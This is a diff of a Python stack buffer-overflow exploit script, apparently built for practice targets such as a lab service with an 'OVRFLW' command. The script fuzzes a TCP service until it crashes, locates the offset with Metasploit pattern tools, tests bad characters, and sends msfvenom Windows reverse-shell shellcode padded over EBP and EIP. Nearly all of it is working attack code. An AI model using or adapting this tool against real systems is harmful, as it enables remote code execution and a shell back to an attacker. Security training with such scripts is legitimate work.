@@ -6,13 +6,13 @@ from colorama import Fore, Back, Style, init
 import codecs
 
 init(autoreset=True) # Colorama auto reset settings
-IP = ('192.168.0.107').encode('utf-8')
-CRASH = 4000
-PORT = 9999
-EBP = 2002
+IP = ('192.168.1.108').encode('latin-1')
+CRASH = 900
+PORT = 4455
+EBP = 774
 EIP = 4
 NOPS = 0
-cmd = "TRUN /.:/ "
+cmd = "OVRFLW"
 
 badcharlist = (
   "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
@@ -35,7 +35,7 @@ badcharlist = (
 
 def Crash(): 
 
-    buffer = ['A']
+    buffer = []
 
     counter = 100
 
@@ -48,38 +48,39 @@ def Crash():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((IP, PORT))
         try:
-            s.send(cmd.encode() + string.encode())
+            s.send(bytes(cmd + string,"latin-1"))
             s.recv(1024)
         except:
-            print(Fore.GREEN + "Program crashed while sending %s bytes"% len(string))
+            print(Fore.GREEN + "Program crashed while sending %s bytes"% str(len(string)-100))
             sys.exit()
         s.close()
 
 def sendPayload(buffer):
     try:
         print(Fore.RED + "Sending Payload ....")
-        print(buffer)
         payload = cmd + buffer
+        print(payload)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        print(Fore.RED + "Payload Sent!")
         s.connect((IP, PORT))
-        s.send(payload)
+        s.send(bytes(payload,"latin-1"))
         s.recv(1024)
+        print(Fore.RED + "Payload Sent!")
         s.close()
         
     except Exception as e:
+        print(e)
         print(Fore.GREEN + "Either the service crashed or it's not running")
 
 def pattern_create(length):
     print("Creating pattern of Length " + str(length))
     pattern = subprocess.run(["msf-pattern_create -l %s"%length], shell=True, stdout=subprocess.PIPE)
-    pattern = pattern.stdout.decode('utf-8')
+    pattern = pattern.stdout.decode('latin-1').strip()
     sendPayload(pattern)
 
 def pattern_offset(offset):
     print("Finding the offset address for " + offset)
     offset = subprocess.run(["msf-pattern_offset -q %s"%offset], shell=True, stdout=subprocess.PIPE)
-    print(offset.stdout.decode('utf-8'))
+    print(offset.stdout.decode('latin-1'))
 
 def send_badchars():
     print("Sending Badchars")
@@ -87,32 +88,38 @@ def send_badchars():
     sendPayload(str(buffer))
 
 def remove_badchars(badchar):
-    
-    new_badchar = badcharlist.encode().hex()
-
+    import itertools    
+    new_badchar = [i for i in badcharlist]
+    hex_digits = ["".join(i) for i in itertools.product("0123456789ABCDEF",repeat=2)][1:]
+     
+    Flag = False
     with open('badchar.txt', 'r') as f:
-        b = f.read()
+        b = f.read().strip()
         f.close()
         for i in b.split(','):
-            new_badchar = new_badchar.replace(i[2:], '')
+            if i == badchar:
+                Flag = True
+                
+            try:
+                index = hex_digits.index(str(i[-2:]).upper())
+                new_badchar.remove(new_badchar[index])
+                hex_digits.remove(hex_digits[index])
+            except Exception as e:
+                print(e)
 
-    new_badchar = new_badchar.replace(badchar[2:], '')
-
+    if not Flag:
+        index = hex_digits.index(badchar[-2:].upper())    
+        new_badchar.remove(new_badchar[index])
+        hex_digits.remove(hex_digits[index])
+    
+    
     with open('badchar.txt', 'w') as f:
         if badchar not in b.split(','):
             b += badchar + ','
         f.write(b)
         f.close()
-
-    new_badchar = r" ".join(new_badchar[n:n + 2] for n in range(0,
-                            len(new_badchar), 2))
-
-    final = ''
-    import binascii
-    for i in new_badchar.split():
-        final += binascii.unhexlify(i).decode('latin-1')
     
-    buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + final + "\x43" * ( CRASH - EBP - EIP - NOPS)
+    buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + "".join(new_badchar) + "\x43" * ( CRASH - EBP - EIP - NOPS)
 
     sendPayload(buffer)
 
@@ -123,19 +130,19 @@ def shellcode():
     3. Windows User Add 
     4. Windows User Add x64
     ''')
-    choice = input(">> ")
+    choice = int(input(">> "))
     if choice == 1 or choice == 2:
         LHOST = input("Enter LHOST IP Address : ")
         LPORT = input("Enter LPORT Number : ")
         print("Generating shellcode")
         if choice == 1:
             shellcode = subprocess.run(["msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f c EXITFUNC=thread --platform windows" %LHOST%LPORT], shell=True, stdout=subprocess.PIPE)
-            shellcode = shellcode.stdout.decode('utf-8')
+            shellcode = shellcode.stdout.decode('latin-1')
             buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - EIP - NOPS)
             sendPayload(buffer)
         if choice == 2:
-            shellcode = subprocess.run(["msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f c EXITFUNC=thread --platform windows -a x64" %LHOST%LPORT], shell=True, stdout=subprocess.PIPE)
-            shellcode = shellcode.stdout.decode('utf-8')
+            shellcode = subprocess.run(["msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -f c EXITFUNC=thread --platform windows -a x64".format(LHOST,LPORT) ], shell=True, stdout=subprocess.PIPE)
+            shellcode = shellcode.stdout.decode('latin-1')
             buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - EIP - NOPS)
             sendPayload(buffer)
 
@@ -169,6 +176,9 @@ if __name__ == '__main__':
         if args.br :
             remove_badchars(args.br)
 
+        if args.s:
+            shellcode()
+            
 
 
         
